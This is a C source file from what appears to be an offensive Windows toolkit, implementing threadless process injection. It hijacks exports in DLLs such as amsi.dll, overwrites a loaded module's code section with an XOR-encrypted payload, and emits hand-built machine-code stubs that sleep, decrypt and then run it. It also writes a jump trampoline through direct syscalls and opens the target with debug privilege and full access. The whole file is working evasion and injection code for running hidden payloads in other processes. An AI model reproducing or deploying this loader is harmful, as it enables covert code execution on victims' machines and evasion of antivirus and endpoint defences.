/**
 * threadless_inject.c - Threadless injection via export hijack + module stomp + Caro-Kann
 */
#include <windows.h>
#include <psapi.h>
#include "../../include/evasion.h"
#include "../../include/module_stomp.h"
#include "../../include/syscalls.h"

#define TRAMPOLINE_SIZE 5
#define DEFAULT_CAROKANN_DELAY_MS 5000
#define DEFAULT_XOR_KEY 0xA7

typedef struct {
    const char *dll;
    const char *export_name;
} HIJACK_CANDIDATE;

static const HIJACK_CANDIDATE g_hijack_candidates[] = {
    {"amsi.dll",       "AmsiUacInitialize"},
    {"dbghelp.dll",    "SymInitialize"},
    {"clbcatq.dll",    "DllGetClassObject"},
    {NULL, NULL}
};

static UINT64 remote_resolve_export(HANDLE proc, HMODULE remote_mod,
                                    const char *dll_name, const char *export_name) {
    HMODULE local = LoadLibraryA(dll_name);
    FARPROC local_fn;
    DWORD_PTR offset;

    if (!local || !remote_mod)
        return 0;

    local_fn = GetProcAddress(local, export_name);
    if (!local_fn)
        return 0;

    offset = (DWORD_PTR)local_fn - (DWORD_PTR)local;
    return (UINT64)((DWORD_PTR)remote_mod + offset);
}

static UINT64 remote_get_sleep_address(HANDLE proc) {
    HMODULE k32_local = GetModuleHandleA("kernel32.dll");
    HMODULE k32_remote = NULL;
    FARPROC sleep_local;
    DWORD_PTR offset;

    if (!k32_local)
        return 0;
    if (!remote_find_module(proc, "kernel32.dll", &k32_remote))
        return 0;

    sleep_local = GetProcAddress(k32_local, "Sleep");
    if (!sleep_local)
        return 0;

    offset = (DWORD_PTR)sleep_local - (DWORD_PTR)k32_local;
    return (UINT64)((DWORD_PTR)k32_remote + offset);
}

static PVOID find_hijack_target(HANDLE proc, HMODULE *out_mod, const char **out_export) {
    for (int i = 0; g_hijack_candidates[i].dll; i++) {
        HMODULE remote_mod = NULL;
        UINT64 func_addr;

        if (!remote_find_module(proc, g_hijack_candidates[i].dll, &remote_mod)) {
            wchar_t path[MAX_PATH];
            if (!module_stomp_system32_path(g_hijack_candidates[i].dll, path, MAX_PATH))
                continue;
            if (!remote_load_dll(proc, path, &remote_mod))
                continue;
        }

        func_addr = remote_resolve_export(proc, remote_mod,
                                          g_hijack_candidates[i].dll,
                                          g_hijack_candidates[i].export_name);
        if (!func_addr)
            continue;

        if (out_mod)
            *out_mod = remote_mod;
        if (out_export)
            *out_export = g_hijack_candidates[i].export_name;
        return (PVOID)func_addr;
    }
    return NULL;
}

static SIZE_T emit_carokann_entry(BYTE *out, SIZE_T cap, DWORD delay_ms, BYTE xor_key,
                                  UINT64 decrypt_start, DWORD decrypt_size,
                                  UINT64 sleep_addr, UINT64 restore_start) {
    SIZE_T pos = 0;

    if (cap < 80)
        return 0;

    out[pos++] = 0x48; out[pos++] = 0x83; out[pos++] = 0xEC; out[pos++] = 0x28;
    out[pos++] = 0xB9;
    CopyMemory(out + pos, &delay_ms, sizeof(DWORD));
    pos += sizeof(DWORD);
    out[pos++] = 0x48; out[pos++] = 0xB8;
    CopyMemory(out + pos, &sleep_addr, sizeof(UINT64));
    pos += sizeof(UINT64);
    out[pos++] = 0xFF; out[pos++] = 0xD0;
    out[pos++] = 0x48; out[pos++] = 0x83; out[pos++] = 0xC4; out[pos++] = 0x28;

    out[pos++] = 0x48; out[pos++] = 0xBE;
    CopyMemory(out + pos, &decrypt_start, sizeof(UINT64));
    pos += sizeof(UINT64);

    out[pos++] = 0xB9;
    CopyMemory(out + pos, &decrypt_size, sizeof(DWORD));
    pos += sizeof(DWORD);

    out[pos++] = 0xB2;
    out[pos++] = xor_key;

    out[pos++] = 0x30; out[pos++] = 0x16;
    out[pos++] = 0x48; out[pos++] = 0xFF; out[pos++] = 0xC6;
    out[pos++] = 0xFF; out[pos++] = 0xC9;
    out[pos++] = 0x75; out[pos++] = 0xF7;

    out[pos++] = 0x48; out[pos++] = 0xB8;
    CopyMemory(out + pos, &restore_start, sizeof(UINT64));
    pos += sizeof(UINT64);
    out[pos++] = 0xFF; out[pos++] = 0xE0;

    return pos;
}

static SIZE_T emit_restore_stub(BYTE *out, SIZE_T cap, UINT64 export_addr,
                                const BYTE *orig, UINT64 payload_start) {
    DWORD orig32;
    SIZE_T pos = 0;

    if (cap < 48 || !orig)
        return 0;

    CopyMemory(&orig32, orig, sizeof(DWORD));

    out[pos++] = 0x48; out[pos++] = 0xB8;
    CopyMemory(out + pos, &export_addr, sizeof(UINT64));
    pos += sizeof(UINT64);

    out[pos++] = 0x41; out[pos++] = 0xBA;
    CopyMemory(out + pos, &orig32, sizeof(DWORD));
    pos += sizeof(DWORD);
    out[pos++] = 0x44; out[pos++] = 0x89; out[pos++] = 0x10;

    out[pos++] = 0xB1;
    out[pos++] = orig[4];
    out[pos++] = 0x88; out[pos++] = 0x48; out[pos++] = 0x04;

    out[pos++] = 0x48; out[pos++] = 0xB8;
    CopyMemory(out + pos, &payload_start, sizeof(UINT64));
    pos += sizeof(UINT64);
    out[pos++] = 0xFF; out[pos++] = 0xE0;

    return pos;
}

static BYTE *build_injection_blob(UINT64 text_base, const BYTE *payload, DWORD payload_size,
                                  UINT64 export_addr, const BYTE *orig_bytes,
                                  UINT64 sleep_addr, DWORD delay_ms, BYTE xor_key,
                                  DWORD *blob_size_out) {
    BYTE carokann[128];
    BYTE restore[64];
    BYTE *blob;
    SIZE_T carokann_len, restore_len;
    UINT64 restore_start, decrypt_start, payload_start;
    DWORD decrypt_size;
    DWORD total;
    DWORD i;

    if (!payload || payload_size == 0 || !orig_bytes || !blob_size_out || !text_base)
        return NULL;

    carokann_len = emit_carokann_entry(carokann, sizeof(carokann), delay_ms, xor_key,
                                       0, 0, sleep_addr, 0);
    restore_len = emit_restore_stub(restore, sizeof(restore), export_addr, orig_bytes, 0);
    if (carokann_len == 0 || restore_len == 0)
        return NULL;

    restore_start = text_base + carokann_len;
    decrypt_start = text_base + carokann_len;
    decrypt_size = (DWORD)(restore_len + payload_size);
    payload_start = text_base + carokann_len + restore_len;

    carokann_len = emit_carokann_entry(carokann, sizeof(carokann), delay_ms, xor_key,
                                       decrypt_start, decrypt_size, sleep_addr, restore_start);
    restore_len = emit_restore_stub(restore, sizeof(restore), export_addr, orig_bytes,
                                    payload_start);
    if (carokann_len == 0 || restore_len == 0)
        return NULL;

    total = (DWORD)(carokann_len + restore_len + payload_size);
    blob = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total);
    if (!blob)
        return NULL;

    CopyMemory(blob, carokann, carokann_len);
    CopyMemory(blob + carokann_len, restore, restore_len);
    CopyMemory(blob + carokann_len + restore_len, payload, payload_size);

    for (i = 0; i < decrypt_size; i++)
        blob[carokann_len + i] ^= xor_key;

    *blob_size_out = total;
    return blob;
}

static BOOL write_trampoline(HANDLE proc, PVOID target_func, PVOID destination) {
    BYTE tramp[TRAMPOLINE_SIZE];
    INT32 rel;
    SIZE_T written = 0;
    ULONG old = 0;
    SIZE_T psz = TRAMPOLINE_SIZE;
    PVOID pbase = target_func;

    rel = (INT32)((ULONG_PTR)destination - ((ULONG_PTR)target_func + TRAMPOLINE_SIZE));
    tramp[0] = 0xE9;
    CopyMemory(tramp + 1, &rel, sizeof(rel));

    if (sys_NtProtectVirtualMemory(proc, &pbase, &psz, PAGE_READWRITE, &old) != 0)
        return FALSE;

    if (sys_NtWriteVirtualMemory(proc, target_func, tramp, TRAMPOLINE_SIZE, &written) != 0 ||
        written != TRAMPOLINE_SIZE)
        return FALSE;

    if (sys_NtProtectVirtualMemory(proc, &pbase, &psz, PAGE_EXECUTE_READ, &old) != 0)
        return FALSE;

    return TRUE;
}

BOOL threadless_restore(THREADLESS_CLEANUP *c) {
    SIZE_T written = 0;
    ULONG old = 0;
    PVOID pbase;
    SIZE_T psz;

    if (!c || !c->process || !c->export_addr)
        return FALSE;

    pbase = c->export_addr;
    psz = TRAMPOLINE_SIZE;

    if (sys_NtProtectVirtualMemory(c->process, &pbase, &psz,
                                   PAGE_READWRITE, &old) != 0)
        return FALSE;

    if (sys_NtWriteVirtualMemory(c->process, c->export_addr,
                                 c->original_bytes, TRAMPOLINE_SIZE,
                                 &written) != 0 || written != TRAMPOLINE_SIZE)
        return FALSE;

    pbase = c->export_addr;
    psz = TRAMPOLINE_SIZE;
    if (sys_NtProtectVirtualMemory(c->process, &pbase, &psz, PAGE_EXECUTE_READ, &old) != 0)
        return FALSE;

    return TRUE;
}

static BOOL prepare_stomp_target(HANDLE proc, const char *stomp_dll,
                                 HMODULE *remote_mod_out, PVOID *text_base_out,
                                 DWORD *text_size_out) {
    HMODULE remote_mod = NULL;
    PVOID text_base = NULL;
    DWORD text_size = 0;
    wchar_t path[MAX_PATH];

    if (!remote_find_module(proc, stomp_dll, &remote_mod)) {
        if (!module_stomp_system32_path(stomp_dll, path, MAX_PATH))
            return FALSE;
        if (!remote_load_dll(proc, path, &remote_mod))
            return FALSE;
    }

    if (!find_remote_text_section(proc, remote_mod, &text_base, &text_size))
        return FALSE;

    if (remote_mod_out)
        *remote_mod_out = remote_mod;
    if (text_base_out)
        *text_base_out = text_base;
    if (text_size_out)
        *text_size_out = text_size;
    return TRUE;
}

typedef struct _CLIENT_ID_S {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID_S;

typedef struct _OBJECT_ATTRIBUTES_S {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES_S;

BOOL threadless_inject_ex(DWORD target_pid, const BYTE *payload, DWORD payload_size,
                          const char *stomp_dll, DWORD delay_ms, PVOID *trigger_out) {
    HANDLE proc = NULL;
    CLIENT_ID_S cid;
    OBJECT_ATTRIBUTES_S oa;
    BOOL ok;

    if (target_pid == 0 || !payload || payload_size == 0)
        return FALSE;

    enable_privilege(L"SeDebugPrivilege");

    cid.UniqueProcess = (HANDLE)(ULONG_PTR)target_pid;
    cid.UniqueThread = NULL;
    oa.Length = sizeof(oa);
    oa.RootDirectory = NULL;
    oa.ObjectName = NULL;
    oa.Attributes = 0;
    oa.SecurityDescriptor = NULL;
    oa.SecurityQualityOfService = NULL;

    if (sys_NtOpenProcess(&proc, PROCESS_ALL_ACCESS, &oa, &cid) != STATUS_SUCCESS)
        return FALSE;

    ok = threadless_inject_handle(proc, payload, payload_size, stomp_dll, delay_ms, trigger_out);
    CloseHandle(proc);
    return ok;
}

BOOL threadless_inject(DWORD target_pid, const BYTE *payload, DWORD payload_size,
                       const char *stomp_dll, DWORD delay_ms) {
    return threadless_inject_ex(target_pid, payload, payload_size, stomp_dll, delay_ms, NULL);
}

BOOL threadless_inject_handle(HANDLE proc, const BYTE *payload, DWORD payload_size,
                              const char *stomp_dll, DWORD delay_ms, PVOID *trigger_out) {
    return threadless_inject_handle_ex(proc, payload, payload_size, stomp_dll,
                                       delay_ms, trigger_out, NULL);
}

BOOL threadless_inject_handle_ex(HANDLE proc, const BYTE *payload, DWORD payload_size,
                                 const char *stomp_dll, DWORD delay_ms,
                                 PVOID *trigger_out, THREADLESS_CLEANUP *cleanup_out) {
    PVOID hijack_func = NULL;
    BYTE original_bytes[TRAMPOLINE_SIZE] = {0};
    SIZE_T rd = 0;
    BYTE *blob = NULL;
    DWORD blob_size = 0;
    PVOID text_base = NULL;
    DWORD text_size = 0;
    const char *stomp = stomp_dll ? stomp_dll : "amsi.dll";
    UINT64 sleep_addr;
    BYTE xor_key = DEFAULT_XOR_KEY;

    if (!proc || !payload || payload_size == 0)
        return FALSE;

    if (delay_ms == 0)
        delay_ms = DEFAULT_CAROKANN_DELAY_MS;

    hijack_func = find_hijack_target(proc, NULL, NULL);
    if (!hijack_func)
        return FALSE;

    if (!prepare_stomp_target(proc, stomp, NULL, &text_base, &text_size))
        return FALSE;

    if (sys_NtReadVirtualMemory(proc, hijack_func, original_bytes,
                                TRAMPOLINE_SIZE, &rd) != 0 || rd != TRAMPOLINE_SIZE)
        return FALSE;

    sleep_addr = remote_get_sleep_address(proc);
    if (!sleep_addr)
        return FALSE;

    blob = build_injection_blob((UINT64)(ULONG_PTR)text_base, payload, payload_size,
                                  (UINT64)(ULONG_PTR)hijack_func, original_bytes,
                                  sleep_addr, delay_ms, xor_key, &blob_size);
    if (!blob)
        return FALSE;

    if (blob_size > text_size) {
        HeapFree(GetProcessHeap(), 0, blob);
        return FALSE;
    }

    if (!stomp_text_section(proc, text_base, text_size, blob, blob_size)) {
        HeapFree(GetProcessHeap(), 0, blob);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, blob);

    if (!write_trampoline(proc, hijack_func, text_base))
        return FALSE;

    if (cleanup_out) {
        cleanup_out->process = proc;
        cleanup_out->export_addr = hijack_func;
        CopyMemory(cleanup_out->original_bytes, original_bytes, TRAMPOLINE_SIZE);
    }

    if (trigger_out)
        *trigger_out = hijack_func;
    return TRUE;
}
